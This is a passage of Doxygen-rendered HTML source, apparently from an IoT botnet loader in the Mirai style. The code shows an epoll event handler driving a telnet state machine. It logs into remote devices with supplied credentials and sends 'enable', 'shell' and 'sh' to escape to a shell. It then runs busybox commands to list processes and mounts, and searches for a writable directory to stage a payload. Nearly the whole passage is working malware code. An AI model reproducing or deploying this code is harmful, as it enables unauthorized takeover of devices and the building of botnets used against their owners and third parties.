class="code" href="structserver__worker.html">server_worker</a> *)arg;</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    <span class="keyword">struct </span>epoll_event events[128];</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <a class="code" href="server_8c.html#a9085c60470ef6f94cdff3dcb4bf03f48">bind_core</a>(wrker-&gt;<a class="code" href="structserver__worker.html#a291525712de364e6d7aabbbd69f593be">thread_id</a>);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    {</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;        <span class="keywordtype">int</span> i, n = epoll_wait(wrker-&gt;<a class="code" href="structserver__worker.html#a34827de4a680ff23c1c2bd27e446edf2">efd</a>, events, 127, -1);</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;        <span class="keywordflow">if</span> (n == -1)</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;            perror(<span class="stringliteral">&quot;epoll_wait&quot;</span>);</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; n; i++)</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;            <a class="code" href="server_8c.html#ac37d85fa12abeeeccfe98a3fcf729294">handle_event</a>(wrker, &amp;events[i]);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;    }</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;}</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;</div><div class="line"><a name="l00184"></a><span class="lineno"><a class="line" href="server_8c.html#ac37d85fa12abeeeccfe98a3fcf729294">  184</a></span>&#160;<span class="keyword">static</span> <span class="keywordtype">void</span> <a class="code" href="server_8c.html#ac37d85fa12abeeeccfe98a3fcf729294">handle_event</a>(<span class="keyword">struct</span> <a class="code" href="structserver__worker.html">server_worker</a> *wrker, <span class="keyword">struct</span> epoll_event *ev)</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;{</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;    <span class="keyword">struct </span><a class="code" href="structconnection.html">connection</a> *conn = wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a712c73b78adff8b0f9d0c824d87eb2c1">estab_conns</a>[ev-&gt;data.fd];</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a> == -1)</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;    {</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;        conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a> = ev-&gt;data.fd;</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;        <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;    }</div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a> != ev-&gt;data.fd)</div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;    {</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        printf(<span class="stringliteral">&quot;yo socket mismatch\n&quot;</span>);</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;    }</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;    <span class="comment">// Check if there was an error</span></div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    <span class="keywordflow">if</span> (ev-&gt;events &amp; EPOLLERR || ev-&gt;events &amp; EPOLLHUP || ev-&gt;events &amp; EPOLLRDHUP)</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;    {</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a>)</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;            printf(<span class="stringliteral">&quot;[FD%d] Encountered an error and must shut down\n&quot;</span>, ev-&gt;data.fd);</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;        <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;    }</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;    <span class="comment">// Are we ready to write?</span></div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> == <a class="code" href="structconnection.html#a73be799c1ca19234b30e96e2f06caa16a7eff4238132aa79b49d65df7d9517f28">TELNET_CONNECTING</a> &amp;&amp; ev-&gt;events &amp; EPOLLOUT)</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;    {</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;        <span class="keyword">struct </span>epoll_event event;</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;        <span class="keywordtype">int</span> so_error = 0;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;        socklen_t len = <span class="keyword">sizeof</span>(so_error);</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;        getsockopt(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, SOL_SOCKET, SO_ERROR, &amp;so_error, &amp;len);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;        <span class="keywordflow">if</span> (so_error)</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;        {</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;            printf(<span class="stringliteral">&quot;[FD%d] Connection refused\n&quot;</span>, ev-&gt;data.fd);</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;            <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;            <span class="keywordflow">return</span>;</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;        }</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;        printf(<span class="stringliteral">&quot;[FD%d] Established connection\n&quot;</span>, ev-&gt;data.fd);</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;        <span class="keyword">event</span>.data.fd = conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;        <span class="keyword">event</span>.events = EPOLLIN | EPOLLET;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;        epoll_ctl(wrker-&gt;<a class="code" href="structserver__worker.html#a34827de4a680ff23c1c2bd27e446edf2">efd</a>, EPOLL_CTL_MOD, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, &amp;event);</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;        conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_READ_IACS;</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;        conn-&gt;<a class="code" href="structconnection.html#a3afa557014f4634b44a4df220e25a20c">timeout</a> = 30;</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;    }</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;    <span class="keywordflow">if</span> (!conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a>)</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;    {</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;        printf(<span class="stringliteral">&quot;socket not open! conn-&gt;fd: %d, fd: %d, events: %08x, state: %08x\n&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, ev-&gt;data.fd, ev-&gt;events, conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a>);</div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;    }</div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;</div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;    <span class="comment">// Is there data to read?</span></div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;    <span class="keywordflow">if</span> (ev-&gt;events &amp; EPOLLIN &amp;&amp; conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a>)</div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;    {</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;        <span class="keywordtype">int</span> ret;</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;        conn-&gt;<a class="code" href="structconnection.html#a873bc9bb606802da7e4437e60581e060">last_recv</a> = time(NULL);</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;        <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;        {</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;            ret = recv(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a> + conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>, sizeof (conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a>) - conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>, MSG_NOSIGNAL);</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;            <span class="keywordflow">if</span> (ret &lt;= 0)</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;            {</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;                <span class="keywordflow">if</span> (errno != EAGAIN &amp;&amp; errno != EWOULDBLOCK)</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;                {</div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;                    <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#afba5e64f29f866fb5348a8def79c6b79">open</a>)</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;                        printf(<span class="stringliteral">&quot;[FD%d] Encountered error %d. Closing\n&quot;</span>, ev-&gt;data.fd, errno);</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;                    <a class="code" href="connection_8c.html#abfa9e4a1232d41a78e5de0a510ed5752">connection_close</a>(conn);</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;                }</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;            }</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;            printf(<span class="stringliteral">&quot;TELIN: %.*s\n&quot;</span>, ret, conn-&gt;<a class="code" href="structconnection.html#abcfdd1496a544cc512f998f1747f4727">rdbuf</a> + conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a>);</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;            conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a> += ret;</div><div class="line"><a name="l00268"></a><span class="lineno">  268</span>&#160;            conn-&gt;<a class="code" href="structconnection.html#a873bc9bb606802da7e4437e60581e060">last_recv</a> = time(NULL);</div><div class="line"><a name="l00269"></a><span class="lineno">  269</span>&#160;</div><div class="line"><a name="l00270"></a><span class="lineno">  270</span>&#160;            <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structconnection.html#af7b674348613e837cc719632401f41de">rdbuf_pos</a> &gt; 8196)</div><div class="line"><a name="l00271"></a><span class="lineno">  271</span>&#160;            {</div><div class="line"><a name="l00272"></a><span class="lineno">  272</span>&#160;                printf(<span class="stringliteral">&quot;oversized buffer pointer!\n&quot;</span>);</div><div class="line"><a name="l00273"></a><span class="lineno">  273</span>&#160;                abort();</div><div class="line"><a name="l00274"></a><span class="lineno">  274</span>&#160;            }</div><div class="line"><a name="l00275"></a><span class="lineno">  275</span>&#160;</div><div class="line"><a name="l00276"></a><span class="lineno">  276</span>&#160;            <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00277"></a><span class="lineno">  277</span>&#160;            {</div><div class="line"><a name="l00278"></a><span class="lineno">  278</span>&#160;                <span class="keywordtype">int</span> consumed;</div><div class="line"><a name="l00279"></a><span class="lineno">  279</span>&#160;</div><div class="line"><a name="l00280"></a><span class="lineno">  280</span>&#160;                <span class="keywordflow">switch</span> (conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a>)</div><div class="line"><a name="l00281"></a><span class="lineno">  281</span>&#160;                {</div><div class="line"><a name="l00282"></a><span class="lineno">  282</span>&#160;                    <span class="keywordflow">case</span> TELNET_READ_IACS:</div><div class="line"><a name="l00283"></a><span class="lineno">  283</span>&#160;                        consumed = <a class="code" href="connection_8c.html#ac38d0bc660e02d86ce1dff3855004c09">connection_consume_iacs</a>(conn);</div><div class="line"><a name="l00284"></a><span class="lineno">  284</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00285"></a><span class="lineno">  285</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_USER_PROMPT;</div><div class="line"><a name="l00286"></a><span class="lineno">  286</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00287"></a><span class="lineno">  287</span>&#160;                    <span class="keywordflow">case</span> TELNET_USER_PROMPT:</div><div class="line"><a name="l00288"></a><span class="lineno">  288</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a8c48ff1129acb53db3b30a26fd9f6e48">connection_consume_login_prompt</a>(conn);</div><div class="line"><a name="l00289"></a><span class="lineno">  289</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00290"></a><span class="lineno">  290</span>&#160;                        {</div><div class="line"><a name="l00291"></a><span class="lineno">  291</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;%s&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#a2c837096dce88f268d64a61d7dca67a1">user</a>);</div><div class="line"><a name="l00292"></a><span class="lineno">  292</span>&#160;                            strcpy(conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#ad12b2efcdef5532753e20ba3a5d41bb2">data</a>, <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00293"></a><span class="lineno">  293</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">deadline</a> = time(NULL) + 1;</div><div class="line"><a name="l00294"></a><span class="lineno">  294</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_PASS_PROMPT;</div><div class="line"><a name="l00295"></a><span class="lineno">  295</span>&#160;                        }</div><div class="line"><a name="l00296"></a><span class="lineno">  296</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00297"></a><span class="lineno">  297</span>&#160;                    <span class="keywordflow">case</span> TELNET_PASS_PROMPT:</div><div class="line"><a name="l00298"></a><span class="lineno">  298</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a509389938f76d6277ffdb912ca8b4283">connection_consume_password_prompt</a>(conn);</div><div class="line"><a name="l00299"></a><span class="lineno">  299</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00300"></a><span class="lineno">  300</span>&#160;                        {</div><div class="line"><a name="l00301"></a><span class="lineno">  301</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;%s&quot;</span>, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#a8f9f7444411b7e42fc6b098d4a14deb0">pass</a>);</div><div class="line"><a name="l00302"></a><span class="lineno">  302</span>&#160;                            strcpy(conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#ad12b2efcdef5532753e20ba3a5d41bb2">data</a>, <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00303"></a><span class="lineno">  303</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#abac1a18cec875d1264fdfa4ffd95c4f7">output_buffer</a>.<a class="code" href="structconnection.html#a1c60f0a6ddc515bda7d7965f357e875e">deadline</a> = time(NULL) + 1;</div><div class="line"><a name="l00304"></a><span class="lineno">  304</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_WAITPASS_PROMPT; <span class="comment">// At the very least it will print SOMETHING</span></div><div class="line"><a name="l00305"></a><span class="lineno">  305</span>&#160;                        }</div><div class="line"><a name="l00306"></a><span class="lineno">  306</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00307"></a><span class="lineno">  307</span>&#160;                    <span class="keywordflow">case</span> TELNET_WAITPASS_PROMPT:</div><div class="line"><a name="l00308"></a><span class="lineno">  308</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a52bc8c56bcf36ab89f034f7f6a7e77f1">connection_consume_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00309"></a><span class="lineno">  309</span>&#160;                        {</div><div class="line"><a name="l00310"></a><span class="lineno">  310</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;enable\r\n&quot;</span>);</div><div class="line"><a name="l00311"></a><span class="lineno">  311</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;shell\r\n&quot;</span>);</div><div class="line"><a name="l00312"></a><span class="lineno">  312</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;sh\r\n&quot;</span>);</div><div class="line"><a name="l00313"></a><span class="lineno">  313</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_CHECK_LOGIN;</div><div class="line"><a name="l00314"></a><span class="lineno">  314</span>&#160;                        }</div><div class="line"><a name="l00315"></a><span class="lineno">  315</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00316"></a><span class="lineno">  316</span>&#160;                    <span class="keywordflow">case</span> TELNET_CHECK_LOGIN:</div><div class="line"><a name="l00317"></a><span class="lineno">  317</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a52bc8c56bcf36ab89f034f7f6a7e77f1">connection_consume_prompt</a>(conn)) &gt; 0)</div><div class="line"><a name="l00318"></a><span class="lineno">  318</span>&#160;                        {</div><div class="line"><a name="l00319"></a><span class="lineno">  319</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00320"></a><span class="lineno">  320</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_VERIFY_LOGIN;</div><div class="line"><a name="l00321"></a><span class="lineno">  321</span>&#160;                        }</div><div class="line"><a name="l00322"></a><span class="lineno">  322</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00323"></a><span class="lineno">  323</span>&#160;                    <span class="keywordflow">case</span> TELNET_VERIFY_LOGIN:</div><div class="line"><a name="l00324"></a><span class="lineno">  324</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a6c25332d5f63d4d1256b55dd786e6295">connection_consume_verify_login</a>(conn);</div><div class="line"><a name="l00325"></a><span class="lineno">  325</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00326"></a><span class="lineno">  326</span>&#160;                        {</div><div class="line"><a name="l00327"></a><span class="lineno">  327</span>&#160;                            <a class="code" href="loader_2src_2headers_2includes_8h.html#a66c32fe2ced559e246bb8a27ac57cd0e">ATOMIC_INC</a>(&amp;wrker-&gt;<a class="code" href="structserver__worker.html#ae7be5e0b65257ad1a73cb9de934342e8">srv</a>-&gt;<a class="code" href="structserver.html#a1c5a1f433b2ab8132769bbcd3f41e2c6">total_logins</a>);</div><div class="line"><a name="l00328"></a><span class="lineno">  328</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00329"></a><span class="lineno">  329</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Succesfully logged in\n&quot;</span>, ev-&gt;data.fd);</div><div class="line"><a name="l00330"></a><span class="lineno">  330</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00331"></a><span class="lineno">  331</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox ps; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00332"></a><span class="lineno">  332</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_PARSE_PS;</div><div class="line"><a name="l00333"></a><span class="lineno">  333</span>&#160;                        }</div><div class="line"><a name="l00334"></a><span class="lineno">  334</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00335"></a><span class="lineno">  335</span>&#160;                    <span class="keywordflow">case</span> TELNET_PARSE_PS:</div><div class="line"><a name="l00336"></a><span class="lineno">  336</span>&#160;                        <span class="keywordflow">if</span> ((consumed = <a class="code" href="connection_8c.html#a9dbd998ccf8ca5a677d860ae6ea83344">connection_consume_psoutput</a>(conn)) &gt; 0)</div><div class="line"><a name="l00337"></a><span class="lineno">  337</span>&#160;                        {</div><div class="line"><a name="l00338"></a><span class="lineno">  338</span>&#160;                            <a class="code" href="loader_2src_2headers_2util_8h.html#a60f0f1eeffd8695d82a60c980fc3adbd">util_sockprintf</a>(conn-&gt;<a class="code" href="structconnection.html#aa9a96cc6c66ef5a617f51247b2809a40">fd</a>, <span class="stringliteral">&quot;/bin/busybox cat /proc/mounts; &quot;</span> <a class="code" href="loader_2src_2headers_2includes_8h.html#a5584596b6561bf1ef1c462d5032c6e12">TOKEN_QUERY</a> <span class="stringliteral">&quot;\r\n&quot;</span>);</div><div class="line"><a name="l00339"></a><span class="lineno">  339</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_PARSE_MOUNTS;</div><div class="line"><a name="l00340"></a><span class="lineno">  340</span>&#160;                        }</div><div class="line"><a name="l00341"></a><span class="lineno">  341</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00342"></a><span class="lineno">  342</span>&#160;                    <span class="keywordflow">case</span> TELNET_PARSE_MOUNTS:</div><div class="line"><a name="l00343"></a><span class="lineno">  343</span>&#160;                        consumed = <a class="code" href="connection_8c.html#a1cabdc0c7a73b41b2e51e515f61bf5db">connection_consume_mounts</a>(conn);</div><div class="line"><a name="l00344"></a><span class="lineno">  344</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00345"></a><span class="lineno">  345</span>&#160;                            conn-&gt;<a class="code" href="structconnection.html#a4bd7d5e932f136c3674aff0425a5646d">state_telnet</a> = TELNET_READ_WRITEABLE;</div><div class="line"><a name="l00346"></a><span class="lineno">  346</span>&#160;                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00347"></a><span class="lineno">  347</span>&#160;                    <span class="keywordflow">case</span> TELNET_READ_WRITEABLE:</div><div class="line"><a name="l00348"></a><span class="lineno">  348</span>&#160;                        consumed = <a class="code" href="connection_8c.html#ab6b2144735ba2c7cedf9b93b4a1927db">connection_consume_written_dirs</a>(conn);</div><div class="line"><a name="l00349"></a><span class="lineno">  349</span>&#160;                        <span class="keywordflow">if</span> (consumed)</div><div class="line"><a name="l00350"></a><span class="lineno">  350</span>&#160;                        {</div><div class="line"><a name="l00351"></a><span class="lineno">  351</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00352"></a><span class="lineno">  352</span>&#160;                            printf(<span class="stringliteral">&quot;[FD%d] Found writeable directory: %s/\n&quot;</span>, ev-&gt;data.fd, conn-&gt;<a class="code" href="structconnection.html#a8ee851eb5e6fa61a5d361029c0e05a82">info</a>.<a class="code" href="structtelnet__info.html#acc55cc9b91cd9f473b0d5fb8082b0ef4">writedir</a>);</div><div class="line"><a 